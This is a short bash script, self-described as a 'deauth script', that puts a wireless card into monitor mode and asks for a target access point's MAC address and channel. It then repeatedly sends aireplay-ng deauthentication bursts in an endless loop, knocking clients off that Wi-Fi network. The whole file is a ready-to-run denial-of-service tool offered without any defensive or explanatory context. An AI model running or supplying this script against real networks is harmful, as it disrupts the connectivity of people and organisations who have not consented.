#!/bin/bash
echo "Welcome to the deauth script - MUST BE RUN AS ROOT"
sleep 5
clear

airmon-ng
echo -n "Enter the wireless card to use for the attack: "
read wcard
clear
airmon-ng start $wcard
clear
echo -n "Enter the MAC address of the target: "
read mac
echo -n "Enter the channel number: "
read chan
xterm -e airodump-ng --channel $chan $wcard &

for (( ; ; ))
do
   echo "Press CTRL+C to stop..."
   aireplay-ng -0 100 -a $mac $wcard
   sleep 60
done
